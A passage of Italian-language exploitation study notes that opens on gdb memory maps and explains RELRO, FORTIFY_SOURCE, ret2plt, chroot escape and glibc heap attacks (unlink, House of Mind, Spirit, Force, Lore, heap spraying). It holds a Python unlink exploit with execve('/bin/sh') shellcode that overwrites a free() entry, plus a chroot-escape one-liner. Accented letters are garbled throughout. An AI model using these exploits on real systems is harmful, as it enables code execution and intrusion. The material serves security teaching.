0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Per il binario **senza relro**, possiamo vedere che l'indirizzo dell'ingresso `got` per `fgets` √® `0x404018`. Guardando le mappature di memoria vediamo che si trova tra `0x404000` e `0x405000`, che ha le **autorizzazioni `rw`**, il che significa che possiamo leggere e scriverci. Per il binario **con relro**, vediamo che l'indirizzo della tabella `got` per l'esecuzione del binario (il pie √® abilitato quindi questo indirizzo cambier√†) √® `0x555555557fd0`. Nelle mappature di memoria di quel binario si trova tra `0x0000555555557000` e `0x0000555555558000`, che ha le autorizzazioni di memoria **`r`**, il che significa che possiamo solo leggerne.

Quale √® il **bypass**? Il tipico bypass che uso √® semplicemente non scrivere nelle regioni di memoria che relro rende di sola lettura e **trovare un modo diverso per ottenere l'esecuzione del codice**.

Nota che affinch√© ci√≤ accada, il binario deve conoscere prima dell'esecuzione gli indirizzi delle funzioni:

* Lazy binding: L'indirizzo di una funzione viene cercato la prima volta che la funzione viene chiamata. Quindi, la GOT deve avere autorizzazioni di scrittura durante l'esecuzione.
* Bind now: Gli indirizzi delle funzioni vengono risolti all'inizio dell'esecuzione, quindi vengono date autorizzazioni di sola lettura a sezioni sensibili come .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Per verificare se un programma utilizza Bind now puoi fare:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Quando il binario √® caricato in memoria e una funzione √® chiamata per la prima volta, si salta alla PLT (Procedure Linkage Table), da qui si effettua un salto (jmp) alla GOT e si scopre che quell'entry non √® stata risolta (contiene un indirizzo successivo della PLT). Quindi si invoca il Runtime Linker o rtfd per risolvere l'indirizzo e salvarlo nella GOT.

Quando una funzione √® chiamata, si chiama la PLT, che contiene l'indirizzo della GOT dove √® salvato l'indirizzo della funzione, quindi reindirizza il flusso l√¨ e la funzione viene chiamata. Tuttavia, se √® la prima volta che la funzione viene chiamata, ci√≤ che √® nella GOT √® l'istruzione successiva della PLT, quindi il flusso segue il codice della PLT (rtfd) e scopre l'indirizzo della funzione, lo salva nella GOT e lo chiama.

Caricando un binario in memoria, il compilatore ha indicato a quale offset posizionare i dati che devono essere caricati quando il programma viene eseguito.

Lazy binding ‚Äî> L'indirizzo della funzione viene cercato la prima volta che viene invocata, quindi la GOT ha i permessi di scrittura in modo che quando viene cercato, venga salvato l√¨ e non sia necessario cercarlo di nuovo.

Bind now ‚Äî> Gli indirizzi delle funzioni vengono cercati durante il caricamento del programma e i permessi delle sezioni .got, .dtors, .ctors, .dynamic, .jcr vengono cambiati in sola lettura. **-z relro** e **-z now**

Nonostante ci√≤, in generale i programmi non sono complicati con queste opzioni, quindi questi attacchi rimangono possibili.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** ‚Äî> Per verificare se viene utilizzato il BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 o =2**

Cerca di identificare le funzioni che copiano in modo insicuro da un luogo all'altro e sostituire la funzione con una funzione sicura.

Ad esempio:\
char buf\[16];\
strcpy(but, source);

Viene identificato come insicuro e quindi sostituisce strcpy() con \_\_strcpy\_chk() utilizzando la dimensione del buffer come dimensione massima da copiare.

La differenza tra **=1** o **=2** √® che:

Il secondo non consente che **%n** provenga da una sezione con permessi di scrittura. Inoltre, il parametro per l'accesso diretto agli argomenti pu√≤ essere utilizzato solo se vengono utilizzati quelli precedenti, cio√® si pu√≤ utilizzare **%3$d** solo se prima sono stati utilizzati **%2$d** e **%1$d**

Per mostrare il messaggio di errore si utilizza argv\[0\], quindi se si inserisce l'indirizzo di un altro luogo (come una variabile globale) il messaggio di errore mostrer√† il contenuto di tale variabile. Pag 191

**Sostituzione di Libsafe**

Si attiva con: LD_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Le chiamate a alcune funzioni insicure vengono intercettate e sostituite con altre sicure. Non √® standardizzato. (solo per x86, non per compilazioni con -fomit-frame-pointer, non compilazioni statiche, non tutte le funzioni vulnerabili diventano sicure e LD_PRELOAD non funziona con binari con setuid).

**ASCII Armored Address Space**

Consiste nel caricare le librerie condivise da 0x00000000 a 0x00ffffff in modo che ci sia sempre un byte 0x00. Tuttavia, questo non ferma praticamente nessun attacco, specialmente in little endian.

**ret2plt**

Consiste nel realizzare un ROP in modo che si chiami la funzione strcpy@plt (dalla plt) e si punti all'entry della GOT e si copi il primo byte della funzione che si vuole chiamare (system()). Successivamente si fa lo stesso puntando a GOT+1 e si copia il secondo byte di system()... Alla fine si chiama l'indirizzo salvato nella GOT che sar√† system()

**Falso EBP**

Per le funzioni che utilizzano l'EBP come registro per puntare agli argomenti, modificando l'EIP e puntando a system(), √® necessario aver modificato anche l'EBP in modo che punti a una zona di memoria che abbia 2 byte qualsiasi e successivamente l'indirizzo a &‚Äù/bin/sh‚Äù.

**Jail con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installa un sistema di base in una directory specifica

Un amministratore pu√≤ uscire da una di queste prigioni facendo: mkdir foo; chroot foo; cd ..

**Strumentazione del codice**

Valgrind ‚Äî> Cerca errori\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits di base**

**Chunk assegnato**

prev_size |\
size | ‚ÄîHeader\
\*mem | Dati

**Chunk libero**

prev_size |\
size |\
\*fd | Ptr chunk successivo\
\*bk | Ptr chunk precedente ‚ÄîHeader\
\*mem | Dati

I chunk liberi sono in una lista doppiamente collegata (bin) e non possono mai esserci due chunk liberi consecutivi (vengono uniti)

In ‚Äúsize‚Äù ci sono bit per indicare: se il chunk precedente √® in uso, se il chunk √® stato assegnato tramite mmap() e se il chunk appartiene all'arena primaria.

Se si libera un chunk e uno dei contigui √® libero, questi vengono fusi tramite la macro unlink() e il nuovo chunk pi√π grande viene passato a frontlink() per inserirlo nel bin appropriato.

unlink(){\
BK = P->bk; ‚Äî> Il BK del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD = P->fd; ‚Äî> Il FD del nuovo chunk √® quello che aveva il chunk precedentemente libero\
FD->bk = BK; ‚Äî> Il BK del chunk successivo punta al nuovo chunk\
BK->fd = FD; ‚Äî> Il FD del chunk precedente punta al nuovo chunk\
}

Pertanto, se riusciamo a modificare P->bk con l'indirizzo di uno shellcode e P->fd con l'indirizzo di un'entry nella GOT o DTORS meno 12, si ottiene:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

E cos√¨, al termine del programma, lo shellcode viene eseguito.

Inoltre, la quarta istruzione di unlink() scrive qualcosa e lo shellcode deve essere preparato per questo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Questo provoca la scrittura di 4 byte a partire dall'8¬∞ byte dello shellcode, quindi la prima istruzione dello shellcode deve essere un jmp per saltare questo e raggiungere una serie di nop che portino al resto dello shellcode.

Pertanto, l'exploit viene creato:

Nel buffer1 si inserisce lo shellcode iniziando con un jmp in modo che cada nei nop o nel resto dello shellcode.

Dopo lo shellcode si inserisce del padding fino a raggiungere il campo prev_size e size del chunk successivo. In questi punti si inseriscono 0xfffffff0 (in modo che venga sovrascritto il prev_size per indicare che √® libero) e ‚Äú-4‚Äù (0xfffffffc) in size (per far s√¨ che quando viene controllato nel terzo chunk se il secondo era libero, in realt√† si vada al prev_size modificato che indicher√† che √® libero) -> Cos√¨ quando free() indaga, andr√† al size del terzo ma in realt√† andr√† al secondo - 4 e penser√† che il secondo chunk sia libero. E quindi chiamer√† **unlink()**.

Chiamando unlink() user√† come P->fd i primi dati del secondo chunk, quindi l√¨ verr√† inserito l'indirizzo da sovrascrivere - 12 (poich√© in FD->bk verr√† aggiunto 12 all'indirizzo salvato in FD). E in quell'indirizzo verr√† inserito il secondo indirizzo trovato nel secondo chunk, che sar√† l'indirizzo dello shellcode (falso P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes di riempimento**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #√à importante che il bit che indica che il chunk precedente √® libero sia impostato su 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, in modo che il "size" del terzo chunk sia considerato 4 byte indietro (punta a prev\_size) dove controlla se il secondo chunk √® libero**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Nel payload all'inizio aggiungiamo 8 byte di riempimento**

**got\_free = pack("\<I", 0x08048300 - 12) #Indirizzo di free() nella plt-12 (sar√† sovrascritto per eseguire lo shellcode la seconda volta che viene chiamato free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Come detto, il payload inizia con 8 byte di riempimento per convenienza**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifichiamo il secondo chunk, got\_free punta al posto dove salveremo l'indirizzo addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() rilasciando in ordine inverso (wargame)**

Stiamo controllando 3 chunk consecutivi e vengono rilasciati in ordine inverso rispetto alla loro allocazione.

In questo caso:

Nel chunk c inseriamo lo shellcode

Utilizziamo il chunk a per sovrascrivere il chunk b in modo che il bit PREV\_INUSE sia disattivato, facendo credere che il chunk a sia libero.

Inoltre, sovraimpostiamo il size nell'intestazione del chunk b in modo che sia -4.

Cos√¨, il programma penser√† che "a" sia libero e in un bin, quindi chiamer√† unlink() per disconnetterlo. Tuttavia, poich√© l'intestazione PREV\_SIZE √® -4, penser√† che il chunk "a" inizi effettivamente a b+4. In altre parole, eseguir√† un unlink() su un chunk che inizia a b+4, quindi a b+12 ci sar√† il puntatore "fd" e a b+16 ci sar√† il puntatore "bk".

In questo modo, se mettiamo l'indirizzo dello shellcode in bk e l'indirizzo della funzione "puts()" -12 in fd, otteniamo il nostro payload.

**Tecnica di Frontlink**

Frontlink viene chiamato quando viene rilasciato un chunk e nessuno dei suoi chunk adiacenti √® libero, non viene chiamato unlink() ma viene chiamato direttamente frontlink().

Vulnerabilit√† utile quando il malloc attaccato non viene mai liberato (free()).

Richiede:

Un buffer che pu√≤ essere sovrascritto con la funzione di input dei dati

Un buffer adiacente a questo che deve essere rilasciato e il cui campo fd dell'intestazione verr√† modificato grazie al buffer precedente

Un buffer da rilasciare con una dimensione maggiore di 512 ma inferiore al buffer precedente

Un buffer dichiarato prima del passaggio 3 che consente di sovrascrivere il prev\_size di questo

In questo modo, sovraimponendo in modo controllato su due mallocs e in modo incontrollato su uno, possiamo creare un exploit.

**Vulnerabilit√† double free()**

Se free() viene chiamato due volte con lo stesso puntatore, ci saranno due bin che puntano allo stesso indirizzo.

Se si desidera riutilizzarne uno, non ci sono problemi. Se si desidera utilizzarne un altro, verr√† assegnato lo stesso spazio, quindi i puntatori "fd" e "bk" saranno falsificati con i dati scritti dalla prenotazione precedente.

**After free()**

Un puntatore precedentemente rilasciato viene riutilizzato senza controllo.

## **8 Heap Overflows: Exploits avanzati**

Le tecniche di Unlink() e FrontLink() sono state eliminate modificando la funzione unlink().

**The house of mind**

√à necessaria solo una chiamata a free() per eseguire del codice arbitrario. √à importante trovare un secondo chunk che pu√≤ essere sovrascritto da uno precedente e rilasciato.

Una chiamata a free() comporta una chiamata a public\_fREe(mem), che fa:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Restituisce un puntatore all'indirizzo in cui inizia il chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

In \[1] controlla il campo size del bit NON\_MAIN\_ARENA, che pu√≤ essere alterato in modo che il controllo restituisca true ed esegua heap\_for\_ptr() che effettua un and a "mem" ponendo a 0 i 2,5 byte meno significativi (nel nostro caso da 0x0804a000 diventa 0x08000000) e accede a 0x08000000->ar\_ptr (come se fosse una struct heap\_info)

In questo modo, se possiamo controllare un chunk ad esempio in 0x0804a000 e verr√† rilasciato un chunk in **0x081002a0** possiamo raggiungere l'indirizzo 0x08100000 e scrivere ci√≤ che vogliamo, ad esempio **0x0804a000**. Quando verr√† rilasciato questo secondo chunk, trover√† che heap\_for\_ptr(ptr)->ar\_ptr restituir√† ci√≤ che abbiamo scritto in 0x08100000 (poich√© si applica a 0x081002a0 l'and che abbiamo visto prima e da l√¨ si ottiene il valore dei primi 4 byte, ar\_ptr)

Quindi viene chiamato \_int\_free(ar\_ptr, mem), cio√® **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Come abbiamo visto prima, possiamo controllare il valore di av, poich√© √® ci√≤ che scriviamo nel chunk che verr√† rilasciato.

Come √® definito unsorted\_chunks, sappiamo che:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Pertanto, se scriviamo il valore di \_\_DTOR\_END\_\_-12 in av->bins\[2] nell'ultima istruzione, verr√† scritto in \_\_DTOR\_END\_\_ l'indirizzo del secondo chunk.

In altre parole, nel primo chunk dobbiamo inserire all'inizio molte volte l'indirizzo di \_\_DTOR\_END\_\_-12 perch√© da l√¨ av->bins\[2] lo prender√†.

Nell'indirizzo in cui cade l'indirizzo del secondo chunk con gli ultimi 5 zeri, dobbiamo scrivere l'indirizzo di questo primo chunk in modo che heap\_for\_ptr() pensi che ar\_ptr sia all'inizio del primo chunk e prenda av->bins\[2] da l√¨.

Nel secondo chunk e grazie al primo sovraimpostiamo il prev\_size con un salto 0x0c e il size con qualcosa per attivare -> NON\_MAIN\_ARENA

Successivamente, nel secondo chunk inseriamo molti nops e infine lo shellcode

In questo modo verr√† chiamato \_int\_free(CHUNK1, CHUNK2) e seguir√† le istruzioni per scrivere in \_\_DTOR\_END\_\_ l'indirizzo del prev\_size di CHUNK2 che salter√† allo shellcode.

Per applicare questa tecnica, sono necessari alcuni requisiti aggiuntivi che complicano un po' il payload.
Questa tecnica non √® pi√π applicabile poich√© √® stato applicato quasi lo stesso patch di unlink. Si confrontano se il nuovo sito a cui si punta sta puntando anche a lui.

**Fastbin**

√à una variante di The house of mind

ci interessa eseguire il seguente codice che si raggiunge dopo la prima verifica della funzione \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Essendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

In questo modo, se viene messo in "fb" d√† l'indirizzo di una funzione nella GOT, in questo indirizzo verr√† messo l'indirizzo del pezzo sovrascritto. Per fare ci√≤ sar√† necessario che l'arena sia vicina agli indirizzi di dtors. Pi√π precisamente, av->max\_fast deve essere all'indirizzo che stiamo sovrascrivendo.

Poich√© con The House of Mind abbiamo visto che controllavamo la posizione di av.

Quindi se nel campo size mettiamo una dimensione di 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ci restituir√† fastbins\[-1], che punter√† a av->max\_fast

In questo caso av->max\_fast sar√† l'indirizzo sovrascritto (non a cui punta, ma quella posizione sar√† sovrascritta).

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 8, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops).

Inoltre, lo stesso falso pezzo deve essere minore di av->system\_mem. av->system\_mem si trova a 1848 byte di distanza.

A causa dei nulli di \_DTOR\_END\_ e delle poche direzioni nella GOT, nessuna direzione di queste sezioni √® adatta per essere sovrascritta, quindi vediamo come applicare fastbin per attaccare lo stack.

Un altro modo per attaccare √® di reindirizzare il **av** verso lo stack.

Se modifichiamo la dimensione in modo che sia 16 invece di 8 allora: fastbin\_index() ci restituir√† fastbins\[0] e possiamo usare questo per sovrascrivere lo stack.

Per fare ci√≤ non deve esserci alcun canary o valori strani nello stack, infatti dobbiamo trovarci in questo: 4byte nulli + EBP + RET

I 4 byte nulli sono necessari affinch√© **av** sar√† a questo indirizzo e il primo elemento di un **av** √® il mutex che deve valere 0.

Il **av->max\_fast** sar√† l'EBP e sar√† un valore che ci permetter√† di saltare le restrizioni.

Nel **av->fastbins\[0]** verr√† sovrascritto con l'indirizzo di **p** e sar√† il RET, cos√¨ si salter√† alla shellcode.

Inoltre, in **av->system\_mem** (1484 byte sopra la posizione nello stack) ci sar√† abbastanza spazzatura che ci permetter√† di saltare il controllo che viene eseguito.

Inoltre, deve essere soddisfatto che il pezzo adiacente a quello liberato deve essere maggiore di 8 -> Dato che abbiamo detto che la dimensione del pezzo liberato √® 16, in questo falso pezzo dobbiamo solo mettere una dimensione maggiore di 8 (inoltre, poich√© la shellcode sar√† nel pezzo liberato, all'inizio dovremo mettere un jmp che cade in nops che vanno dopo il campo size del nuovo falso pezzo).

**The House of Spirit**

In questo caso cerchiamo di avere un puntatore a un malloc che possa essere modificato dall'attaccante (ad esempio, che il puntatore sia nello stack sotto a un possibile overflow a una variabile).

Quindi, potremmo fare in modo che questo puntatore punti dove vogliamo. Tuttavia, non tutti i siti sono validi, la dimensione del pezzo falso deve essere minore di av->max\_fast e pi√π specificamente uguale alla dimensione richiesta in una futura chiamata a malloc()+8. Pertanto, se sappiamo che dopo questo puntatore vulnerabile viene chiamato malloc(40), la dimensione del pezzo falso deve essere uguale a 48.

Se ad esempio il programma chiedesse all'utente un numero potremmo inserire 48 e puntare il puntatore di malloc modificabile ai successivi 4 byte (che potrebbero appartenere all'EBP con fortuna, cos√¨ il 48 rimane dietro, come se fosse l'intestazione size). Inoltre, l'indirizzo ptr-4+48 deve soddisfare diverse condizioni (essendo in questo caso ptr=EBP), cio√®, 8 < ptr-4+48 < av->system\_mem.

Nel caso in cui ci√≤ si verifichi, quando viene chiamato il successivo malloc che abbiamo detto che era malloc(40) gli verr√† assegnato come indirizzo l'indirizzo dell'EBP. Nel caso in cui l'attaccante possa anche controllare cosa viene scritto in questo malloc pu√≤ sovrascrivere sia l'EBP che l'EIP con l'indirizzo che desidera.

Penso che ci√≤ sia perch√© quando verr√† liberato free() salver√† che nell'indirizzo che punta all'EBP dello stack c'√® un pezzo di dimensioni perfette per il nuovo malloc() che si desidera riservare, quindi gli assegna quell'indirizzo.

**The House of Force**

√à necessario:

* Un overflow a un pezzo che permetta di sovrascrivere il wilderness
* Una chiamata a malloc() con la dimensione definita dall'utente
* Una chiamata a malloc() i cui dati possono essere definiti dall'utente

La prima cosa da fare √® sovrascrivere la dimensione del pezzo wilderness con un valore molto grande (0xffffffff), quindi qualsiasi richiesta di memoria sufficientemente grande verr√† gestita in \_int\_malloc() senza la necessit√† di espandere l'heap

La seconda √® modificare av->top in modo che punti a una zona di memoria sotto il controllo dell'attaccante, come lo stack. In av->top verr√† messo \&EIP - 8.

Dobbiamo sovrascrivere av->top in modo che punti alla zona di memoria sotto il controllo dell'attaccante:

vittima = av->top;

resto = chunck\_at\_offset(vittima, nb);

av->top = resto;

La vittima raccoglie il valore dell'indirizzo del pezzo wilderness attuale (l'attuale av->top) e il resto √® esattamente la somma di quell'indirizzo pi√π la quantit√† di byte richiesti da malloc(). Quindi se \&EIP-8 √® in 0xbffff224 e av->top contiene 0x080c2788, allora la quantit√† che dobbiamo riservare nel malloc controllato affinch√© av->top punti a $EIP-8 per il prossimo malloc() sar√†:

0xbffff224 - 0x080c2788 = 3086207644.

Quindi verr√† salvato in av->top il valore modificato e il prossimo malloc punter√† all'EIP e potr√† sovrascriverlo.

√à importante sapere che la dimensione del nuovo pezzo wilderness sia pi√π grande della richiesta fatta dall'ultimo malloc(). Cio√®, se il wilderness punta a \&EIP-8, la dimensione finir√† esattamente nel campo EBP dello stack.

**The House of Lore**

**Corruzione SmallBin**

I pezzi liberati vengono inseriti nel bin in base alla loro dimensione. Ma prima di essere inseriti vengono conservati in unsorted bins. Un pezzo liberato non viene immediatamente inserito nel suo bin ma rimane in unsorted bins. Successivamente, se viene riservato un nuovo pezzo e il precedente liberato pu√≤ servire, viene restituito, ma se viene riservato un pezzo pi√π grande, il pezzo liberato in unsorted bins viene inserito nel suo bin appropriato.

Per raggiungere il codice vulnerabile, la richiesta di memoria deve essere maggiore di av->max\_fast (di solito 72) e inferiore a MIN\_LARGE\_SIZE (512).

Se nel bin c'√® un pezzo della dimensione corretta rispetto a ci√≤ che viene richiesto, viene restituito dopo essere stato scollegato:

bck = vittima->bk; Puntatore al pezzo precedente, √® l'unica informazione che possiamo alterare.

bin->bk = bck; Il penultimo pezzo diventa l'ultimo, nel caso in cui bck punti allo stack al prossimo pezzo riservato verr√† assegnato questo indirizzo

bck->fd = bin; Si chiude la lista facendo s√¨ che punti a bin

√à necessario:
**Corruzione LargeBin**

Sono necessari gli stessi requisiti di prima e alcuni in pi√π, inoltre i chunk allocati devono essere superiori a 512.

L'attacco √® simile a quello precedente, cio√® bisogna modificare il puntatore bk e sono necessarie tutte quelle chiamate a malloc(), ma in pi√π bisogna modificare la dimensione del chunk modificato in modo che quella dimensione - nb sia < MINSIZE.

Ad esempio, bisogna impostare la dimensione a 1552 in modo che 1552 - 1544 = 8 < MINSIZE (la sottrazione non pu√≤ essere negativa perch√© si confronta con un unsigned)

Inoltre √® stato introdotto un patch per rendere l'attacco ancora pi√π complicato.

**Heap Spraying**

Fondamentalmente consiste nel prenotare il maggior numero possibile di heap e riempirli con un tappetino di nops seguito da una shellcode. Inoltre, come tappetino si utilizza 0x0c. Si cercher√† di saltare all'indirizzo 0x0c0c0c0c, quindi se si sovrascrive un indirizzo a cui verr√† chiamato questo tappetino, si salter√† l√¨. Fondamentalmente la tattica √® prenotare il massimo possibile per vedere se si sovrascrive qualche puntatore e saltare a 0x0c0c0c0c sperando che ci siano nops l√¨.

**Heap Feng Shui**

Consiste nel cementare la memoria mediante prenotazioni e liberazioni in modo che ci siano chunk prenotati tra chunk liberi. Il buffer da sforzare sar√† situato in uno di questi chunk.
